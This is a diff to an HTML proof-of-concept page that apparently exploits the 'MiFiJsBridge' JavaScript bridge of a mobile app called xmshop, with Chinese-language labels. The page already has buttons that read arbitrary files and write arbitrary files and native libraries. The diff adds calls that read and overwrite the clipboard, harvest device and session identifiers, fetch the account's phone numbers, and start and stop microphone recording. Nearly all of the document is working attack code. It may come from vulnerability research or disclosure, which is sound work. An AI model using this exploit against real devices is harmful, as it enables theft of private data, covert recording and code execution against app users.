@@ -3,19 +3,21 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>xmshop merged storage/lib PoC</title>
+  <title>xmshop merged storage+bridge PoC</title>
   <style>
     body { font-family: sans-serif; margin: 14px; line-height: 1.45; }
-    h3 { margin: 10px 0 6px; }
+    h2,h3 { margin: 10px 0 6px; }
     input, textarea, select, button { width: 100%; box-sizing: border-box; margin: 6px 0; padding: 8px; }
     textarea { min-height: 120px; font-family: monospace; }
     button { cursor: pointer; }
     pre { background: #f5f5f5; padding: 10px; white-space: pre-wrap; word-break: break-all; }
     .box { border: 1px solid #ddd; padding: 10px; margin-bottom: 12px; }
+    .row { display: flex; gap: 8px; }
+    .row > button { flex: 1; }
   </style>
 </head>
 <body>
-  <h2>xmshop 合并版 PoC</h2>
+  <h2>xmshop 合并版 PoC（Storage + Bridge）</h2>
   <p>页面 URL 必须带 <code>_debug=true</code>，例如：<code>https://your-domain/poc_merged.html?_debug=true</code></p>
 
   <div class="box">
@@ -55,6 +57,39 @@
     <button id="btnWriteLib">写任意 lib（硬编码）</button>
   </div>
 
+  <div class="box">
+    <h3>4) System.readClipboard / writeClipboard</h3>
+    <label>写入剪贴板内容</label>
+    <input id="clipData" value="pwn_clipboard_text" />
+    <div class="row">
+      <button id="btnReadClipboard">读取剪贴板</button>
+      <button id="btnWriteClipboard">写入剪贴板</button>
+    </div>
+  </div>
+
+  <div class="box">
+    <h3>5) Data 标识接口（3项）</h3>
+    <div class="row">
+      <button id="btnData3">读取 getDeviceId/getSessionId/getDeviceInfo</button>
+    </div>
+  </div>
+
+  <div class="box">
+    <h3>6) Account.getPhoneNumber</h3>
+    <button id="btnAccountPhone">读取手机号列表（异步回调）</button>
+  </div>
+
+  <div class="box">
+    <h3>7) Voice.startRecord / stopRecord / cancelRecord</h3>
+    <label>startRecord 参数（String）</label>
+    <input id="voiceParam" value="xmshop_voice" />
+    <div class="row">
+      <button id="btnVoiceStart">startRecord</button>
+      <button id="btnVoiceStop">stopRecord</button>
+      <button id="btnVoiceCancel">cancelRecord</button>
+    </div>
+  </div>
+
   <h3>输出</h3>
   <pre id="out"></pre>
 
@@ -68,13 +103,21 @@ function log(x) {
   out.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
 }
 
-function invoke(feature, action, param) {
-  const raw = window.MiFiJsBridge.invoke(feature, action, param, null);
-  try { return JSON.parse(raw); } catch (_) { return { raw }; }
+function parseMaybeJson(raw) {
+  if (raw == null) return raw;
+  if (typeof raw !== 'string') return raw;
+  try { return JSON.parse(raw); } catch (_) { return raw; }
 }
+
+function invoke(feature, action, param, callbackExpr) {
+  const raw = window.MiFiJsBridge.invoke(feature, action, param, callbackExpr || null);
+  return parseMaybeJson(raw);
+}
+
 function lookup(feature, action) {
   return window.MiFiJsBridge.lookup(feature, action);
 }
+
 function ensureBridge() {
   if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge missing');
   const lSet = lookup('Storage', 'setPreferenceV2');
@@ -84,6 +127,22 @@ function ensureBridge() {
   if (lSet !== 0 || lLoad !== 0 || lSave !== 0) {
     throw new Error('Storage unavailable. Check launch chain and _debug=true');
   }
+}
+
+function ensureAvailable(feature, action) {
+  if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge missing');
+  const code = lookup(feature, action);
+  log({ lookup: { feature, action, code } });
+  if (code !== 0) throw new Error(`${feature}.${action} unavailable, code=${code}`);
+}
+
+function makeCallback(prefix) {
+  const fn = `__mifi_cb_${prefix}_${Date.now()}_${Math.floor(Math.random()*100000)}`;
+  window[fn] = function(respRaw) {
+    const parsed = parseMaybeJson(respRaw);
+    log({ callback: fn, data: parsed });
+  };
+  return `window.${fn}`;
 }
 
 function setMeta(path, format) {
@@ -147,9 +206,99 @@ function writeAnyLib() {
   }
 }
 
+function readClipboard() {
+  try {
+    ensureAvailable('System', 'readClipboard');
+    const r = invoke('System', 'readClipboard', null);
+    log({ 'System.readClipboard': r });
+  } catch (e) {
+    log('ERR(readClipboard): ' + e.message);
+  }
+}
+
+function writeClipboard() {
+  try {
+    ensureAvailable('System', 'writeClipboard');
+    const d = document.getElementById('clipData').value;
+    const r = invoke('System', 'writeClipboard', d);
+    log({ 'System.writeClipboard': r });
+  } catch (e) {
+    log('ERR(writeClipboard): ' + e.message);
+  }
+}
+
+function readData3() {
+  try {
+    ensureAvailable('Data', 'getDeviceId');
+    ensureAvailable('Data', 'getSessionId');
+    ensureAvailable('Data', 'getDeviceInfo');
+    const r1 = invoke('Data', 'getDeviceId', null);
+    const r2 = invoke('Data', 'getSessionId', null);
+    const r3 = invoke('Data', 'getDeviceInfo', null);
+    log({
+      'Data.getDeviceId': r1,
+      'Data.getSessionId': r2,
+      'Data.getDeviceInfo': r3
+    });
+  } catch (e) {
+    log('ERR(readData3): ' + e.message);
+  }
+}
+
+function accountPhone() {
+  try {
+    ensureAvailable('Account', 'getPhoneNumber');
+    const cb = makeCallback('account_phone');
+    const r = invoke('Account', 'getPhoneNumber', null, cb);
+    log({ 'Account.getPhoneNumber': r, callback: cb });
+  } catch (e) {
+    log('ERR(accountPhone): ' + e.message);
+  }
+}
+
+function voiceStart() {
+  try {
+    ensureAvailable('Voice', 'startRecord');
+    const p = document.getElementById('voiceParam').value;
+    const cb = makeCallback('voice_start');
+    const r = invoke('Voice', 'startRecord', p, cb);
+    log({ 'Voice.startRecord': r, callback: cb, param: p });
+  } catch (e) {
+    log('ERR(voiceStart): ' + e.message);
+  }
+}
+
+function voiceStop() {
+  try {
+    ensureAvailable('Voice', 'stopRecord');
+    const r = invoke('Voice', 'stopRecord', null);
+    log({ 'Voice.stopRecord': r });
+  } catch (e) {
+    log('ERR(voiceStop): ' + e.message);
+  }
+}
+
+function voiceCancel() {
+  try {
+    ensureAvailable('Voice', 'cancelRecord');
+    const r = invoke('Voice', 'cancelRecord', null);
+    log({ 'Voice.cancelRecord': r });
+  } catch (e) {
+    log('ERR(voiceCancel): ' + e.message);
+  }
+}
+
 document.getElementById('btnRead').addEventListener('click', readAny);
 document.getElementById('btnWriteFile').addEventListener('click', writeAnyFile);
 document.getElementById('btnWriteLib').addEventListener('click', writeAnyLib);
+document.getElementById('btnReadClipboard').addEventListener('click', readClipboard);
+document.getElementById('btnWriteClipboard').addEventListener('click', writeClipboard);
+document.getElementById('btnData3').addEventListener('click', readData3);
+document.getElementById('btnAccountPhone').addEventListener('click', accountPhone);
+document.getElementById('btnVoiceStart').addEventListener('click', voiceStart);
+document.getElementById('btnVoiceStop').addEventListener('click', voiceStop);
+document.getElementById('btnVoiceCancel').addEventListener('click', voiceCancel);
+
 log('PoC loaded');
 </script>
 </body>
